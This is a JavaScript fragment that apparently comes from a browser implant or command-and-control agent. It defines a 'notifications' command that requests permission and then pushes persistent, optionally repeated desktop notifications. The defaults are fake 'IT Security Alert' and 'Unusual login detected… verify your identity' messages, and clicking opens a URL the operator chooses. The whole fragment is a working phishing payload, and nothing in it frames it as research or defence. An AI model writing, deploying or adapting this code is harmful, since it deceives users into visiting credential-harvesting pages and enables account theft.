COMMANDS['notifications'] = async function(task) {
    var params = task.parameters;
    if (typeof params === 'string') {
        try { params = JSON.parse(params); } catch (e) { params = {}; }
    }
    var title = (params && params.title) ? params.title : 'IT Security Alert';
    var body = (params && params.body) ? params.body : 'Unusual login detected on your account. Click to verify your identity.';
    var icon = (params && params.icon) ? params.icon : '';
    var url = (params && params.url) ? params.url : '';
    var count = (params && params.count) ? parseInt(params.count) : 1;

    if (!('Notification' in window)) {
        return JSON.stringify({error: 'Notification API not available'}, null, 2);
    }

    // Request permission if needed
    var perm = Notification.permission;
    if (perm === 'default') {
        perm = await Notification.requestPermission();
    }

    if (perm !== 'granted') {
        return JSON.stringify({
            error: 'Notification permission denied',
            permission: perm
        }, null, 2);
    }

    var sent = 0;
    for (var i = 0; i < count; i++) {
        var opts = {body: body, requireInteraction: true};
        if (icon) opts.icon = icon;

        var n = new Notification(title, opts);
        if (url) {
            n.onclick = function() {
                window.open(url, '_blank');
            };
        }
        sent++;
        // Small delay between multiple notifications
        if (count > 1 && i < count - 1) {
            await new Promise(function(r) { setTimeout(r, 300); });
        }
    }

    return JSON.stringify({
        permission: perm,
        sent: sent,
        title: title,
        body: body,
        clickUrl: url || '(none)'
    }, null, 2);
};
